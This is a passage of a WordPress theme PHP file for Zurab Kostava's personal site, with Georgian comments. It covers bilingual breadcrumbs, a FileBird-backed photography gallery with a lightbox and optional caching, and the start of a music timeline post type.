        if ( ! empty( $categories ) ) {
            $cat = $categories[0];

            // თუ კატეგორიას აქვს მშობელი (მაგ: Raw / გაუფილტრავი)
            if ( $cat->parent != 0 ) {
                $parent_cat   = get_category( $cat->parent );
                $parent_path  = wp_parse_url( get_term_link( $parent_cat ), PHP_URL_PATH );
                $parent_name  = zk_get_breadcrumb_term_label( $parent_cat, $is_ka );
                $parent_route = rtrim( $parent_path, '/' );
                $parent_url   = get_term_link( $parent_cat );

                echo '<span class="zk-breadcrumb-separator">/</span>';
                echo '<a href="' . esc_url( $parent_url ) . '" data-route="' . esc_attr( $parent_route ) . '">' . esc_html( $parent_name ) . '</a>';
            }

            // უშუალოდ მიმდინარე კატეგორია (მაგ: Nocturnes / ძილისპირულები)
            $cat_path      = wp_parse_url( get_term_link( $cat ), PHP_URL_PATH );
            $cat_name      = zk_get_breadcrumb_term_label( $cat, $is_ka );
            $cat_route     = rtrim( $cat_path, '/' );
            $cat_url       = get_term_link( $cat );

            echo '<span class="zk-breadcrumb-separator">/</span>';
            echo '<a href="' . esc_url( $cat_url ) . '" data-route="' . esc_attr( $cat_route ) . '">' . esc_html( $cat_name ) . '</a>';
        }

        // უშუალოდ პოსტის სათაური
        $post_title = $is_ka ? ( get_post_meta( get_the_ID(), '_zk_title_ka', true ) ?: get_the_title() ) : get_the_title();
        if ( $is_ka && function_exists( 'zk_uppercase_ka' ) ) {
            $post_title = zk_uppercase_ka( $post_title );
        }
        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<span class="zk-breadcrumb-current">' . esc_html( $post_title ) . '</span>';

    } elseif ( is_page() ) {
        // --- ლოგიკა უშუალოდ გვერდებისთვის (მაგ: როცა ხარ Blog/Raw/Aubades გვერდზე) ---
        global $post;
        $ancestors = get_post_ancestors( $post );

        if ( $ancestors ) {
            $ancestors = array_reverse( $ancestors ); // ვატრიალებთ, რომ Home-დან დაიწყოს
            foreach ( $ancestors as $ancestor ) {
                $anc_post  = get_post( $ancestor );
                $anc_slug  = $anc_post->post_name;
                $anc_path  = '/' . trim( get_page_uri( $anc_post ), '/' );
                $anc_route = $is_ka ? ( $anc_path === '' ? '/ka/' : '/ka' . $anc_path ) : ( $anc_path === '' ? '/' : $anc_path );
                $anc_url   = get_permalink( $anc_post );
                if ( $is_ka && function_exists( 'zk_filter_permalink_ka' ) ) {
                    $anc_url = zk_filter_permalink_ka( $anc_url );
                }
                $anc_title = zk_get_breadcrumb_crumb_label( $anc_post->post_title, $anc_slug, $anc_post->ID, $is_ka );

                echo '<span class="zk-breadcrumb-separator">/</span>';
                echo '<a href="' . esc_url( $anc_url ) . '" data-route="' . esc_attr( $anc_route ) . '">' . esc_html( $anc_title ) . '</a>';
            }
        }

        // უშუალოდ მიმდინარე გვერდის სათაური
        $curr_slug  = $post->post_name;
        $curr_title = zk_get_breadcrumb_crumb_label( get_the_title(), $curr_slug, $post->ID, $is_ka );
        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<span class="zk-breadcrumb-current">' . esc_html( $curr_title ) . '</span>';

    } elseif ( is_archive() || is_search() ) {
        // --- ლოგიკა არქივებისთვის და თეგებისთვის ---
        $blog_label = zk_get_breadcrumb_crumb_label( 'Blog', 'blog', 0, $is_ka );
        $blog_route = $is_ka ? '/ka/blog' : '/blog';
        $blog_url   = $is_ka ? home_url( '/ka/blog/' ) : home_url( '/blog/' );

        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<a href="' . esc_url( $blog_url ) . '" data-route="' . esc_attr( $blog_route ) . '">' . esc_html( $blog_label ) . '</a>';

        echo '<span class="zk-breadcrumb-separator">/</span>';
        if ( is_tag() ) {
            $topic_label = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( 'თემა: ' ) : 'თემა: ' ) : 'Topic: ';
            $tag_obj     = get_queried_object();
            $tag_title   = zk_get_breadcrumb_term_label( $tag_obj, $is_ka );
            echo '<span class="zk-breadcrumb-current">' . esc_html( $topic_label . $tag_title ) . '</span>';
        } elseif ( is_category() ) {
            $cat_obj   = get_queried_object();
            $cat_title = zk_get_breadcrumb_term_label( $cat_obj, $is_ka );
            echo '<span class="zk-breadcrumb-current">' . esc_html( $cat_title ) . '</span>';
        } else {
            $arch_label = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( 'არქივი' ) : 'არქივი' ) : 'Archive';
            echo '<span class="zk-breadcrumb-current">' . esc_html( $arch_label ) . '</span>';
        }
    }

    echo '</nav>';
}

/* ============================================================
   ENABLE EXCERPTS (მოკლე აღწერების იძულებითი ჩართვა)
   ============================================================ */
function zk_force_enable_excerpts() {
    add_post_type_support( 'page', 'excerpt' );
    add_post_type_support( 'post', 'excerpt' ); // პოსტებზეც იძულებით ვრთავთ, ყოველ შემთხვევისთვის
}
add_action( 'init', 'zk_force_enable_excerpts', 999 );



/* ============================================================
   ZURAB KOSTAVA - CINEMATIC PHOTOGRAPHY GALLERY (V5 - Hardened)
   ============================================================ */

/**
 * Build a human EXIF string ("Camera • 35mm • f/1.8") for an attachment.
 * Reads only the cached _wp_attachment_metadata — no extra queries.
 */
function zk_attachment_exif( $attachment_id ) {
    $meta = wp_get_attachment_metadata( $attachment_id );
    if ( empty( $meta['image_meta'] ) ) {
        return '';
    }
    $im    = $meta['image_meta'];
    $parts = array_filter( array(
            ! empty( $im['camera'] )       ? $im['camera']              : '',
            ! empty( $im['focal_length'] ) ? $im['focal_length'] . 'mm' : '',
            ! empty( $im['aperture'] )     ? 'f/' . $im['aperture']     : '',
    ) );
    return $parts ? implode( ' • ', $parts ) : '';
}

/**
 * Photography folders we pull from. Keyed by the exact FileBird folder name,
 * mapped to the CSS filter class the front-end toggles on.
 */
function zk_gallery_folders( $gallery_id = 'photography' ) {
    $settings = function_exists( 'zk_visual_gallery_get_settings' ) ? zk_visual_gallery_get_settings() : array();
    $gallery  = isset( $settings[ $gallery_id ] ) ? $settings[ $gallery_id ] : array();
    $folders  = array();
    foreach ( isset( $gallery['tabs'] ) && is_array( $gallery['tabs'] ) ? $gallery['tabs'] : array() as $tab ) {
        if ( empty( $tab['id'] ) ) continue;
        $class = 'filter-' . sanitize_html_class( $tab['id'] );
        if ( ! empty( $tab['folder_id'] ) ) $folders[ (int) $tab['folder_id'] ] = $class;
        elseif ( ! empty( $tab['folder_name'] ) ) $folders[ (string) $tab['folder_name'] ] = $class;
    }
    return $folders;
}

/**
 * Responsive source data shared by every gallery using the cinematic lightbox.
 * The grid stays lightweight while the viewer can request the best image for
 * the actual screen instead of always downloading the original upload.
 */
function zk_gallery_lightbox_source_attributes( $attachment_id ) {
    $srcset = wp_get_attachment_image_srcset( $attachment_id, 'full' );

    return array(
        'data-full-srcset' => $srcset ? esc_attr( $srcset ) : '',
        'data-full-sizes'  => '90vw',
    );
}

/**
 * Labels used by the photography gallery controls.
 *
 * English is the safe fallback for newly added site languages until their
 * interface copy is supplied here (or through the filter below).
 */
function zk_gallery_labels( $language = '', $gallery_id = 'photography' ) {
    $language = $language ?: ( function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en' );
    $settings = function_exists( 'zk_visual_gallery_get_settings' ) ? zk_visual_gallery_get_settings() : array();
    $gallery  = isset( $settings[ $gallery_id ] ) ? $settings[ $gallery_id ] : array();
    $all      = isset( $gallery['all_labels'][ $language ] ) && '' !== trim( (string) $gallery['all_labels'][ $language ] ) ? $gallery['all_labels'][ $language ] : ( isset( $gallery['all_labels']['en'] ) ? $gallery['all_labels']['en'] : 'All' );
    $aria     = isset( $gallery['aria_labels'][ $language ] ) && '' !== trim( (string) $gallery['aria_labels'][ $language ] ) ? $gallery['aria_labels'][ $language ] : ( isset( $gallery['aria_labels']['en'] ) ? $gallery['aria_labels']['en'] : 'Filter gallery' );
    $labels   = array( 'filters_label' => $aria, 'all' => $all, 'tabs' => array() );
    foreach ( isset( $gallery['tabs'] ) && is_array( $gallery['tabs'] ) ? $gallery['tabs'] : array() as $tab ) {
        if ( empty( $tab['id'] ) ) continue;
        $label = isset( $tab['labels'][ $language ] ) && '' !== trim( (string) $tab['labels'][ $language ] ) ? $tab['labels'][ $language ] : ( isset( $tab['labels']['en'] ) ? $tab['labels']['en'] : $tab['id'] );
        $labels['tabs'][ $tab['id'] ] = $label;
        $labels[ $tab['id'] ] = $label; // Backward-compatible access.
    }
    return apply_filters( 'zk_gallery_labels', $labels, $language, $gallery_id );
}

function zk_gallery_empty_markup( $gallery_definition, $labels, $gallery_id ) {
    $language = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
    $message  = 'ka' === $language ? 'გალერეა მზადაა — ნამუშევრები მალე დაემატება.' : 'The gallery is ready — artworks will be added soon.';
    if ( current_user_can( 'manage_options' ) ) {
        $message .= ' ' . ( 'ka' === $language ? 'ფოტოები დაამატეთ შესაბამის FileBird საქაღალდეში.' : 'Add images to its assigned FileBird folder.' );
    }
    $output  = '<div class="zk-gallery-wrapper zk-gallery-wrapper--empty" data-gallery="' . esc_attr( $gallery_id ) . '">';
    $output .= '<div class="zk-gallery-filters" role="group" aria-label="' . esc_attr( $labels['filters_label'] ) . '">';
    $output .= '<div class="zk-gallery-tab-highlight" aria-hidden="true"></div>';
    $output .= '<button class="zk-filter-btn is-active" type="button" data-filter="all" aria-pressed="true">' . esc_html( $labels['all'] ) . ' <span class="zk-tab-count">0</span></button>';
    foreach ( isset( $gallery_definition['tabs'] ) && is_array( $gallery_definition['tabs'] ) ? $gallery_definition['tabs'] : array() as $tab ) {
        if ( empty( $tab['id'] ) ) continue;
        $label = isset( $labels['tabs'][ $tab['id'] ] ) ? $labels['tabs'][ $tab['id'] ] : $tab['id'];
        $output .= '<button class="zk-filter-btn" type="button" data-filter="filter-' . esc_attr( sanitize_html_class( $tab['id'] ) ) . '" aria-pressed="false">' . esc_html( $label ) . ' <span class="zk-tab-count">0</span></button>';
    }
    $output .= '</div><div class="zk-gallery-empty"><span aria-hidden="true">◇</span><p>' . esc_html( $message ) . '</p></div></div>';
    return $output;
}

function zk_cinematic_gallery( $atts = array() ) {
    $atts = shortcode_atts( array( 'gallery' => 'photography' ), is_array( $atts ) ? $atts : array(), 'zk_visual_gallery' );
    $gallery_id = sanitize_key( $atts['gallery'] );
    $gallery_settings = function_exists( 'zk_visual_gallery_get_settings' ) ? zk_visual_gallery_get_settings() : array();
    if ( ! isset( $gallery_settings[ $gallery_id ] ) ) $gallery_id = 'photography';
    $gallery_definition = isset( $gallery_settings[ $gallery_id ] ) ? $gallery_settings[ $gallery_id ] : array();

    // Optional render cache (off by default — see zk_flush_gallery_cache notes).
    $language  = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
    $labels    = zk_gallery_labels( $language, $gallery_id );
    $cache_key = 'zk_gallery_html_v8_' . sanitize_key( $gallery_id ) . '_' . sanitize_key( $language );
    $use_cache = (bool) apply_filters( 'zk_gallery_cache_enabled', false );
    if ( $use_cache ) {
        $cached = get_transient( $cache_key );
        if ( is_string( $cached ) ) {
            return $cached;
        }
    }

    global $wpdb;
    $fbv_table = $wpdb->prefix . 'fbv';
    $rel_table = $wpdb->prefix . 'fbv_attachment_folder';

    // Guard: is FileBird installed? esc_like() so "_" isn't read as a wildcard.
    $found = $wpdb->get_var( $wpdb->prepare( 'SHOW TABLES LIKE %s', $wpdb->esc_like( $fbv_table ) ) );
    if ( $found !== $fbv_table ) {
        return '<p class="page__content" style="color:#ff5555;">FileBird tables not found.</p>';
    }

    $folder_map = zk_gallery_folders( $gallery_id );
    if ( empty( $folder_map ) ) return zk_gallery_empty_markup( $gallery_definition, $labels, $gallery_id );

    $folder_class = array(); // folder_id => filter-xxx
    $folder_names = array();
    foreach ( $folder_map as $folder_key => $filter_class ) {
        if ( is_int( $folder_key ) || ctype_digit( (string) $folder_key ) ) $folder_class[ (int) $folder_key ] = $filter_class;
        else $folder_names[ (string) $folder_key ] = $filter_class;
    }
    if ( $folder_names ) {
        $name_ph = implode( ', ', array_fill( 0, count( $folder_names ), '%s' ) );
        $folders = $wpdb->get_results( $wpdb->prepare( "SELECT id, name FROM {$fbv_table} WHERE name IN ($name_ph)", array_keys( $folder_names ) ) );
        foreach ( $folders as $folder ) if ( isset( $folder_names[ $folder->name ] ) ) $folder_class[ (int) $folder->id ] = $folder_names[ $folder->name ];
    }
    if ( empty( $folder_class ) ) return zk_gallery_empty_markup( $gallery_definition, $labels, $gallery_id );

    // (1.5) Fetch Subfolders (Carousels)
    $folder_ids = array_keys( $folder_class );
    $id_ph      = implode( ', ', array_fill( 0, count( $folder_ids ), '%d' ) );
    $subfolders = $wpdb->get_results(
            $wpdb->prepare( "SELECT id, name, parent FROM {$fbv_table} WHERE parent IN ($id_ph)", $folder_ids )
    );
    
    $subfolder_ids = array();
    $subfolder_names = array();
    foreach ( $subfolders as $sf ) {
        // Map subfolder to its parent's category class
        $folder_class[ (int) $sf->id ] = $folder_class[ (int) $sf->parent ];
        $subfolder_ids[ (int) $sf->id ] = true;
        $subfolder_names[ (int) $sf->id ] = $sf->name;
    }

    // (2) Folder ids → attachments (+ category map)
    $all_folder_ids = array_keys( $folder_class );
    $all_id_ph = implode( ', ', array_fill( 0, count( $all_folder_ids ), '%d' ) );
    $rows = $wpdb->get_results(
            $wpdb->prepare( "SELECT attachment_id, folder_id FROM {$rel_table} WHERE folder_id IN ($all_id_ph) ORDER BY attachment_id DESC", $all_folder_ids )
    );
    
    if ( empty( $rows ) ) return zk_gallery_empty_markup( $gallery_definition, $labels, $gallery_id );

    $category_map = array(); // attachment_id => filter-xxx (first folder wins)
    $name_to_carousel = array(); // subfolder_name => array of attachment_ids
    $carousel_categories = array(); // subfolder_name => array of filter-xxx classes
    $att_to_folder = array(); // attachment_id => folder_id

    foreach ( $rows as $row ) {
        $att = (int) $row->attachment_id;
        $fid = (int) $row->folder_id;
        
        if ( ! isset( $att_to_folder[ $att ] ) ) {
            $att_to_folder[ $att ] = $fid;
        }
        
        if ( isset( $subfolder_ids[ $fid ] ) ) {
            $name = $subfolder_names[$fid];
            $name_to_carousel[ $name ][] = $att;
            
            if ( isset( $folder_class[ $fid ] ) ) {
                $carousel_categories[ $name ][] = $folder_class[ $fid ];
            }
        }

        if ( ! isset( $category_map[ $att ] ) && isset( $folder_class[ $fid ] ) ) {
            $category_map[ $att ] = $folder_class[ $fid ];
        }
    }

    // (3) Fetch attachments. WP_Query primes the post + meta caches in bulk.
    $query = new WP_Query( array(
            'post_type'              => 'attachment',
            'post_status'            => 'inherit',
            'post_mime_type'         => 'image',
            'posts_per_page'         => -1,
            'post__in'               => array_keys( $category_map ),
            'orderby'                => 'date',
            'order'                  => 'DESC',
            'no_found_rows'          => true,
            'update_post_term_cache' => false,
    ) );

    // Dynamic filters, labels, badges and counts from Visual Galleries admin.
    $filter_definitions = array();
    foreach ( isset( $gallery_definition['tabs'] ) && is_array( $gallery_definition['tabs'] ) ? $gallery_definition['tabs'] : array() as $tab ) {
        if ( empty( $tab['id'] ) ) continue;
        $class = 'filter-' . sanitize_html_class( $tab['id'] );
        $filter_definitions[ $class ] = array(
            'label'      => isset( $labels['tabs'][ $tab['id'] ] ) ? $labels['tabs'][ $tab['id'] ] : $tab['id'],
            'source_tag' => isset( $tab['source_tag'] ) ? $tab['source_tag'] : '',
            'count'      => 0,
        );
    }
    foreach ( $category_map as $class ) {
        if ( isset( $filter_definitions[ $class ] ) ) $filter_definitions[ $class ]['count']++;
    }
    $total_photos = count( $category_map );

    $output  = '<div class="zk-gallery-wrapper">';
    if ( current_user_can('administrator') ) {
        $total_views = 0;
        foreach ( array_keys($category_map) as $att_id ) {
            $total_views += (int) get_post_meta( $att_id, 'zk_photo_views', true );
        }
        $output .= '<div class="zk-total-views-admin" style="text-align:center; padding: 15px 20px; color: #0ff; font-weight: 600; font-family: monospace; font-size: 15px; letter-spacing: 2px; background: rgba(0,255,255,0.05); border-radius: 8px; margin-bottom: 20px;">TOTAL GALLERY VIEWS: ' . $total_views . '</div>';
    }
    $output .= '<div class="zk-gallery-filters" role="group" aria-label="' . esc_attr( $labels['filters_label'] ) . '">';
    $output .= '<div class="zk-gallery-tab-highlight" aria-hidden="true"></div>';
    $output .= '<button class="zk-filter-btn is-active" type="button" data-filter="all" aria-pressed="true">' . esc_html( $labels['all'] ) . ' <span class="zk-tab-count">' . $total_photos . '</span></button>';
    foreach ( $filter_definitions as $filter_class => $definition ) {
        $output .= '<button class="zk-filter-btn" type="button" data-filter="' . esc_attr( $filter_class ) . '" aria-pressed="false">' . esc_html( $definition['label'] ) . ' <span class="zk-tab-count">' . (int) $definition['count'] . '</span></button>';
    }
    $output .= '</div>';

    $output .= '<div class="zk-gallery-grid" id="zkGalleryGrid">';

    $i = 0;
    $rendered_carousels = array();
    $rendered_attachments = array();

    while ( $query->have_posts() ) {
        $query->the_post();
        $image_id = get_the_ID();

        if ( isset( $rendered_attachments[ $image_id ] ) ) {
            continue;
        }

        $fid = isset($att_to_folder[$image_id]) ? $att_to_folder[$image_id] : 0;
        $is_carousel = isset($subfolder_ids[$fid]);

        if ( $is_carousel ) {
            $carousel_name = $subfolder_names[$fid];
            if ( isset( $rendered_carousels[ $carousel_name ] ) ) {
                continue;
            }
            $rendered_carousels[ $carousel_name ] = true;
            
            // Collect unique classes for the merged carousel
            $cat_classes_array = isset($carousel_categories[$carousel_name]) ? array_unique($carousel_categories[$carousel_name]) : array('all');
            $cat_class = implode(' ', $cat_classes_array);
            
            // Determine tag for cover photo
            $base_cat = isset( $category_map[ $image_id ] ) ? $category_map[ $image_id ] : '';
            $source_tag = isset( $filter_definitions[ $base_cat ]['source_tag'] ) ? $filter_definitions[ $base_cat ]['source_tag'] : '';

            // Output cover image
            $full_img  = wp_get_attachment_image_url( $image_id, 'full' );
            $thumb_img = wp_get_attachment_image_url( $image_id, 'thumbnail' );
            $exif_text = zk_attachment_exif( $image_id );
            $alt_text  = get_post_meta( $image_id, '_wp_attachment_image_alt', true );
            $title     = get_the_title( $image_id );
            $caption   = wp_get_attachment_caption( $image_id );
            $description = get_post( $image_id )->post_content;

            if ( empty( $alt_text ) ) $alt_text = $title;
            if ( empty( $alt_text ) ) $alt_text = 'Zurab Kostava Capture';

            $img_attributes = array(
                    'data-full'        => esc_url( $full_img ),
                    'data-thumb'       => esc_url( $thumb_img ? $thumb_img : $full_img ),
                    'data-exif'        => esc_attr( $exif_text ),
                    'data-title'       => esc_attr( $title ),
                    'data-caption'     => esc_attr( $caption ),
                    'data-description' => esc_attr( $description ),
                    'data-id'          => esc_attr( $image_id ),
                    'class'            => 'zk-grid-photo',
                    'alt'              => esc_attr( $alt_text ),
                    'sizes'            => '(max-width: 600px) 100vw, (max-width: 900px) 50vw, (max-width: 1320px) 33vw, 440px'
            );
            $img_attributes = array_merge( $img_attributes, zk_gallery_lightbox_source_attributes( $image_id ) );
            
            if ( current_user_can('administrator') ) {
                $img_attributes['data-views'] = (int) get_post_meta( $image_id, 'zk_photo_views', true );
            }

            if ( $i < 6 ) {
                $img_attributes['loading']       = 'eager';
                $img_attributes['fetchpriority'] = 'high';
            } else {
                $img_attributes['loading']  = 'lazy';
                $img_attributes['decoding'] = 'async';
            }

            $img_html = wp_get_attachment_image( $image_id, 'medium_large', false, $img_attributes );
            $folder_title = $carousel_name;
            
            // Calculate total photos in this folder
            $carousel_count = isset($name_to_carousel[$carousel_name]) ? count($name_to_carousel[$carousel_name]) : 1;

            $output .= '<div class="zk-gallery-item zk-is-carousel ' . esc_attr( $cat_class ) . '" data-category="' . esc_attr( $cat_class ) . '" data-carousel-title="' . esc_attr( $folder_title ) . '" data-source="' . esc_attr( $source_tag ) . '">';
            $output .= '<div class="zk-gallery-image-wrap">';
            $output .= $img_html;
            
            // Photo count badge
            $output .= '<div class="zk-carousel-count"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg> ' . $carousel_count . '</div>';

            if ( $folder_title ) {
                $output .= '<div class="zk-carousel-title">' . esc_html( $folder_title ) . '</div>';
            }
            $output .= '<svg class="zk-carousel-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="14" height="14" rx="2" ry="2"></rect><path d="M7 21h12a2 2 0 0 0 2-2V7"></path></svg>';
            
            if ( current_user_can('administrator') ) {
                $views = (int) get_post_meta( $image_id, 'zk_photo_views', true );
                $output .= '<div class="zk-photo-admin-views" style="position:absolute;top:10px;left:10px;background:rgba(0,0,0,0.8);color:#0ff;padding:4px 8px;border-radius:4px;font-size:12px;z-index:10;pointer-events:none;display:flex;align-items:center;gap:4px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg> ' . $views . '</div>';
            }

            $output .= '</div></div>';

            $rendered_attachments[ $image_id ] = true;
            $i++;

            // Output hidden items for this merged carousel
            if ( isset( $name_to_carousel[ $carousel_name ] ) ) {
                foreach ( $name_to_carousel[ $carousel_name ] as $c_att ) {
                    if ( $c_att == $image_id ) continue;

                    $c_full_img  = wp_get_attachment_image_url( $c_att, 'full' );
                    if ( ! $c_full_img ) continue;
                    
                    $c_thumb_img = wp_get_attachment_image_url( $c_att, 'thumbnail' );
                    $c_exif_text = zk_attachment_exif( $c_att );
                    $c_alt_text  = get_post_meta( $c_att, '_wp_attachment_image_alt', true );
                    $c_title     = get_the_title( $c_att );
                    $c_caption   = wp_get_attachment_caption( $c_att );
                    $c_description = get_post( $c_att )->post_content;

                    if ( empty( $c_alt_text ) ) $c_alt_text = $c_title;
                    if ( empty( $c_alt_text ) ) $c_alt_text = 'Zurab Kostava Capture';

                    // Determine tag for hidden photo
                    $c_base_cat = isset( $category_map[ $c_att ] ) ? $category_map[ $c_att ] : '';
                    $c_source_tag = isset( $filter_definitions[ $c_base_cat ]['source_tag'] ) ? $filter_definitions[ $c_base_cat ]['source_tag'] : '';

                    $c_img_attributes = array(
                            'data-full'        => esc_url( $c_full_img ),
                            'data-thumb'       => esc_url( $c_thumb_img ? $c_thumb_img : $c_full_img ),
                            'data-exif'        => esc_attr( $c_exif_text ),
                            'data-title'       => esc_attr( $c_title ),
                            'data-caption'     => esc_attr( $c_caption ),
                            'data-description' => esc_attr( $c_description ),
                            'data-id'          => esc_attr( $c_att ),
                            'class'            => 'zk-grid-photo',
                            'alt'              => esc_attr( $c_alt_text ),
                            'loading'          => 'lazy',
                            'decoding'         => 'async',
                            'sizes'            => '1vw' // Minimize browser effort
                    );
                    $c_img_attributes = array_merge( $c_img_attributes, zk_gallery_lightbox_source_attributes( $c_att ) );
                    
                    if ( current_user_can('administrator') ) {
                        $c_img_attributes['data-views'] = (int) get_post_meta( $c_att, 'zk_photo_views', true );
                    }

                    $c_img_html = wp_get_attachment_image( $c_att, 'thumbnail', false, $c_img_attributes );

                    $output .= '<div class="zk-gallery-item zk-carousel-hidden ' . esc_attr( $cat_class ) . '" data-category="' . esc_attr( $cat_class ) . '" data-carousel-title="' . esc_attr( $folder_title ) . '" data-source="' . esc_attr( $c_source_tag ) . '">';
                    $output .= '<div class="zk-gallery-image-wrap">' . $c_img_html . '</div>';
                    $output .= '</div>';

                    $rendered_attachments[ $c_att ] = true;
                }
            }

        } else {
            // Standard photo
            $full_img  = wp_get_attachment_image_url( $image_id, 'full' );
            $thumb_img = wp_get_attachment_image_url( $image_id, 'thumbnail' );
            $cat_class = isset( $category_map[ $image_id ] ) ? $category_map[ $image_id ] : 'all';
            $exif_text = zk_attachment_exif( $image_id );

            $alt_text    = get_post_meta( $image_id, '_wp_attachment_image_alt', true );
            $title       = get_the_title( $image_id );
            $caption     = wp_get_attachment_caption( $image_id );
            $description = get_post( $image_id )->post_content;

            if ( empty( $alt_text ) ) $alt_text = $title;
            if ( empty( $alt_text ) ) $alt_text = 'Zurab Kostava Capture';

            $img_attributes = array(
                    'data-full'        => esc_url( $full_img ),
                    'data-thumb'       => esc_url( $thumb_img ? $thumb_img : $full_img ),
                    'data-exif'        => esc_attr( $exif_text ),
                    'data-title'       => esc_attr( $title ),
                    'data-caption'     => esc_attr( $caption ),
                    'data-description' => esc_attr( $description ),
                    'data-id'          => esc_attr( $image_id ),
                    'class'            => 'zk-grid-photo',
                    'alt'              => esc_attr( $alt_text ),
                    'sizes'            => '(max-width: 600px) 100vw, (max-width: 900px) 50vw, (max-width: 1320px) 33vw, 440px'
            );
            $img_attributes = array_merge( $img_attributes, zk_gallery_lightbox_source_attributes( $image_id ) );
            
            if ( current_user_can('administrator') ) {
                $img_attributes['data-views'] = (int) get_post_meta( $image_id, 'zk_photo_views', true );
            }

            if ( $i < 6 ) {
                $img_attributes['loading']       = 'eager';
                $img_attributes['fetchpriority'] = 'high';
            } else {
                $img_attributes['loading']  = 'lazy';
                $img_attributes['decoding'] = 'async';
            }

            $img_html = wp_get_attachment_image( $image_id, 'medium_large', false, $img_attributes );

            $output .= '<div class="zk-gallery-item ' . esc_attr( $cat_class ) . '" data-category="' . esc_attr( $cat_class ) . '">';
            $output .= '<div class="zk-gallery-image-wrap">' . $img_html;
            
            if ( current_user_can('administrator') ) {
                $views = (int) get_post_meta( $image_id, 'zk_photo_views', true );
                $output .= '<div class="zk-photo-admin-views" style="position:absolute;top:10px;left:10px;background:rgba(0,0,0,0.8);color:#0ff;padding:4px 8px;border-radius:4px;font-size:12px;z-index:10;pointer-events:none;display:flex;align-items:center;gap:4px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg> ' . $views . '</div>';
            }
            
            $output .= '</div></div>';
            
            $rendered_attachments[ $image_id ] = true;
            $i++;
        }
    }
    wp_reset_postdata();
    $output .= '</div></div>';

    // Cinematic lightbox — one instance, rebuilt with the view on SPA swaps.
    $output .= '<div class="zk-lightbox" id="zkLightbox" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Photo viewer">';
    $output .= '<div class="zk-lightbox-top-title" id="zkLightboxTopTitle"></div>';
    $output .= '<button class="zk-lightbox-close" type="button" aria-label="Close">✕</button>';
    $output .= '<button class="zk-lightbox-arrow zk-lightbox-prev" type="button" aria-label="Previous"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"></polyline></svg></button>';
    $output .= '<button class="zk-lightbox-arrow zk-lightbox-next" type="button" aria-label="Next"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="9 18 15 12 9 6"></polyline></svg></button>';
    $output .= '<img class="zk-lightbox-img" src="" alt="" decoding="async">';
    $output .= '<div class="zk-lightbox-exif" id="zkLightboxExif"></div>';
    $output .= '<div class="zk-lightbox-thumbs" id="zkLightboxThumbs"></div>';
    $output .= '</div>';

    if ( $use_cache ) {
        set_transient( $cache_key, $output, 6 * HOUR_IN_SECONDS );
    }

    return $output;
}
add_shortcode( 'zk_photography', 'zk_cinematic_gallery' );
add_shortcode( 'zk_visual_gallery', 'zk_cinematic_gallery' );
add_shortcode( 'zk_paint', function () {
    return zk_cinematic_gallery( array( 'gallery' => 'paint' ) );
} );
add_shortcode( 'zk_graphic', function () {
    return zk_cinematic_gallery( array( 'gallery' => 'graphic' ) );
} );

/**
 * Optional gallery render cache — OFF by default.
 * Enable with:  add_filter( 'zk_gallery_cache_enabled', '__return_true' );
 * These hooks bust it whenever the media library changes. Note: moving an
 * image between FileBird folders fires no core hook, so the 6h TTL is the
 * backstop there — flush manually (or wait it out) after re-foldering.
 */
function zk_flush_gallery_cache() {
    delete_transient( 'zk_gallery_html_v5' );
    $languages = function_exists( 'zk_get_languages' ) ? zk_get_languages( false ) : array( 'en' => array(), 'ka' => array() );
    foreach ( array_keys( $languages ) as $language ) {
        delete_transient( 'zk_gallery_html_v6_' . sanitize_key( $language ) );
        delete_transient( 'zk_gallery_html_v7_' . sanitize_key( $language ) );
        foreach ( array( 'photography', 'paint', 'graphic' ) as $gallery_id ) {
            delete_transient( 'zk_gallery_html_v8_' . $gallery_id . '_' . sanitize_key( $language ) );
        }
    }
}
add_action( 'add_attachment',    'zk_flush_gallery_cache' );
add_action( 'edit_attachment',   'zk_flush_gallery_cache' );
add_action( 'delete_attachment', 'zk_flush_gallery_cache' );



/* ============================================================
   🎵 MUSIC TIMELINE - FULL MODULE (CPT + META + SHORTCODE)
   ============================================================ */

// 1. მენიუს შექმნა (Custom Post Type)
function zk_register_music_timeline_cpt() {
    $labels = array(
            'name'               => 'Music Timeline',
            'singular_name'      => 'Release',
            'menu_name'          => 'Music Timeline',
            'add_new'            => 'Add New Release',
            'add_new_item'       => 'Add New Release',
            'edit_item'          => 'Edit Release',
            'all_items'          => 'All Releases',
    );
    $args = array(
            'labels'             => $labels,
            'public'             => false,
            'show_ui'            => true,
            'show_in_menu'       => true,
            'menu_icon'          => 'dashicons-format-audio',
            'supports'           => array( 'title', 'editor' ),
            'has_archive'        => false,
    );
    register_post_type( 'zk_music_release', $args );
}
add_action( 'init', 'zk_register_music_timeline_cpt' );

// 2. ველების (Meta Boxes) ვიზუალის აწყობა ედიტორში
function zk_music_add_meta_box() {
